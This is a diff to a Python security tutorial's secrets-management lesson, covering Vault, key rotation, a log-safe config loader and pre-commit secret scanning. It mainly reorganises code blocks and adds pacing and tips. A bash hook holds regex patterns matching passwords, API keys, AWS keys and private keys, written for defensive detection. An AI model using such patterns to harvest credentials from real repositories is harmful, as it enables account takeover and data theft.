+        "python"
+    )
+
+    pace()
+
+    code_block(
         '# HashiCorp Vault\n'
         'import hvac\n'
         '\n'
@@ -1272,6 +1587,8 @@ def _lesson_secrets_management(progress):
         "python"
     )
 
+    pace()
+
     press_enter()
 
     # --- Key rotation ---
@@ -1279,10 +1596,15 @@ def _lesson_secrets_management(progress):
 
     lesson_block(
         "Secrets should be rotated (replaced with new values) on a regular "
-        "schedule and immediately after any suspected compromise.  Rotation "
-        "limits the damage if a secret is leaked — an old secret that has been "
-        "rotated is useless to an attacker."
+        "schedule and immediately after any suspected compromise."
     )
+
+    lesson_block(
+        "Rotation limits the damage if a secret is leaked -- an old secret "
+        "that has been rotated is useless to an attacker."
+    )
+
+    pace()
 
     code_block(
         '"""key_rotation.py — Pattern for zero-downtime key rotation."""\n'
@@ -1304,8 +1626,13 @@ def _lesson_secrets_management(progress):
         '        self.primary = os.environ[primary_env]\n'
         '        self.secondary = os.environ.get(\n'
         '            secondary_env or f"{primary_env}_PREVIOUS", ""\n'
-        '        )\n'
-        '\n'
+        '        )',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '    def verify(self, token, verify_func):\n'
         '        """Try to verify with primary key, fall back to secondary."""\n'
         '        try:\n'
@@ -1324,16 +1651,22 @@ def _lesson_secrets_management(progress):
         "python"
     )
 
+    pace()
+
+    nice_work("Key rotation is an advanced topic, and you just nailed it!")
+
     press_enter()
 
     # --- Secure config loader ---
     sub_header("Building a Secure Config Loader")
 
     lesson_block(
-        "Here is a complete, production-quality configuration loader that "
-        "supports multiple secret sources, validates required settings, and "
-        "prevents accidental secret exposure:"
+        "Here is a production-quality configuration loader that supports "
+        "multiple secret sources, validates required settings, and prevents "
+        "accidental secret exposure."
     )
+
+    pace()
 
     code_block(
         '"""secure_config.py — Centralized, secure configuration loader."""\n'
@@ -1357,8 +1690,13 @@ def _lesson_secrets_management(progress):
         '    jwt_secret: str = ""      # loaded from env/secret manager\n'
         '    api_key: str = ""         # loaded from env/secret manager\n'
         '    debug: bool = False\n'
-        '    allowed_origins: list = field(default_factory=list)\n'
-        '\n'
+        '    allowed_origins: list = field(default_factory=list)',
+        "python"
+    )
+
+    pace()
+
+    code_block(
         '    # Mark which fields are secrets (for safe logging)\n'
         '    SECRET_FIELDS = {"db_password", "jwt_secret", "api_key"}\n'
         '\n'
@@ -1376,24 +1714,20 @@ def _lesson_secrets_management(progress):
         '\n'
         '    def __repr__(self):\n'
         '        """Never accidentally log secrets."""\n'
-        '        return f"AppConfig({self.safe_dict()})"\n'
-        '\n'
-        '\n'
+        '        return f"AppConfig({self.safe_dict()})"',
+        "python"
+    )
+
+    pace()
+
+    tip("The safe_dict() pattern prevents secrets from appearing in logs or error messages.")
+
+    code_block(
         'def load_config() -> AppConfig:\n'
         '    """Load configuration from environment variables.\n'
         '\n'
         '    Priority: env vars > .env file > defaults\n'
         '    """\n'
-        '    # Optionally load .env for local development\n'
-        '    env_file = Path(".env")\n'
-        '    if env_file.exists():\n'
-        '        logger.info("Loading .env file for local development")\n'
-        '        for line in env_file.read_text().splitlines():\n'
-        '            line = line.strip()\n'
-        '            if line and not line.startswith("#") and "=" in line:\n'
-        '                key, _, value = line.partition("=")\n'
-        '                os.environ.setdefault(key.strip(), value.strip())\n'
-        '\n'
         '    config = AppConfig(\n'
         '        db_host=os.environ.get("DB_HOST", "localhost"),\n'
         '        db_port=int(os.environ.get("DB_PORT", "5432")),\n'
@@ -1403,9 +1737,6 @@ def _lesson_secrets_management(progress):
         '        jwt_secret=os.environ.get("JWT_SECRET", ""),\n'
         '        api_key=os.environ.get("API_KEY", ""),\n'
         '        debug=os.environ.get("DEBUG", "false").lower() == "true",\n'
-        '        allowed_origins=json.loads(\n'
-        '            os.environ.get("ALLOWED_ORIGINS", "[]")\n'
-        '        ),\n'
         '    )\n'
         '\n'
         '    # Validate required settings\n'
@@ -1419,11 +1750,12 @@ def _lesson_secrets_management(progress):
         '            f"Set them as environment variables."\n'
         '        )\n'
         '\n'
-        '    # Log safe version of config at startup\n'
         '    logger.info(f"Configuration loaded: {config.safe_dict()}")\n'
         '    return config',
         "python"
     )
+
+    pace()
 
     press_enter()
 
@@ -1431,10 +1763,12 @@ def _lesson_secrets_management(progress):
     sub_header("Preventing Accidental Secret Commits")
 
     lesson_block(
-        "Even with .gitignore, developers sometimes accidentally commit secrets "
-        "in code files. Pre-commit hooks and scanning tools catch this before "
-        "the secret reaches the repository."
+        "Even with .gitignore, developers sometimes accidentally commit "
+        "secrets in code files. Pre-commit hooks and scanning tools catch "
+        "this before the secret reaches the repository."
     )
+
+    pace()
 
     code_block(
         '# .pre-commit-config.yaml\n'
@@ -1443,7 +1777,7 @@ def _lesson_secrets_management(progress):
         '    rev: v1.4.0\n'
         '    hooks:\n'
         '      - id: detect-secrets\n'
-        '        args: [\"--baseline\", \".secrets.baseline\"]\n'
+        '        args: ["--baseline", ".secrets.baseline"]\n'
         '\n'
         '  - repo: https://github.com/zricethezav/gitleaks\n'
         '    rev: v8.18.0\n'
@@ -1457,19 +1791,26 @@ def _lesson_secrets_management(progress):
         "yaml"
     )
 
+    pace()
+
     code_block(
         '# Simple custom pre-commit hook: .git/hooks/pre-commit\n'
         '#!/bin/bash\n'
         '# Prevent committing files that might contain secrets\n'
         '\n'
         'PATTERNS=(\n'
-        '    "password\\s*=\\s*[\"\\x27][^\"\\x27]+[\"\\x27]"\n'
-        '    "api[_-]?key\\s*=\\s*[\"\\x27][^\"\\x27]+[\"\\x27]"\n'
-        '    "secret\\s*=\\s*[\"\\x27][^\"\\x27]+[\"\\x27]"\n'
+        '    "password\\s*=\\s*[\\"\\x27][^\\"\\x27]+[\\"\\x27]"\n'
+        '    "api[_-]?key\\s*=\\s*[\\"\\x27][^\\"\\x27]+[\\"\\x27]"\n'
+        '    "secret\\s*=\\s*[\\"\\x27][^\\"\\x27]+[\\"\\x27]"\n'
         '    "AKIA[0-9A-Z]{16}"  # AWS access key pattern\n'
         '    "-----BEGIN (RSA |EC )?PRIVATE KEY-----"\n'
-        ')\n'
-        '\n'
+        ')',
+        "bash"
+    )
+
+    pace()
+
+    code_block(
         'for pattern in "${PATTERNS[@]}"; do\n'
         '    if git diff --cached | grep -iE "$pattern" > /dev/null; then\n'
         '        echo "ERROR: Possible secret detected in staged files!"\n'
@@ -1481,16 +1822,25 @@ def _lesson_secrets_management(progress):
         "bash"
     )
 
+    pace()
+
     press_enter()
 
     why_it_matters(
         "Secret exposure is one of the fastest paths from 'minor misconfiguration' "
         "to 'catastrophic data breach.' When secrets are committed to a public "
-        "repository, automated bots detect and exploit them within minutes. "
-        "Even in private repositories, any developer, contractor, or compromised "
-        "CI system with read access can harvest them. Proper secrets management "
-        "is a non-negotiable requirement for any production system."
+        "repository, automated bots detect and exploit them within minutes."
     )
+
+    pace()
+
+    tip(
+        "Even in private repositories, any developer, contractor, or compromised "
+        "CI system with read access can harvest secrets. Proper secrets "
+        "management is a non-negotiable requirement for any production system."
+    )
+
+    pace()
 
     scenario_block(
         "The AWS Key in GitHub",
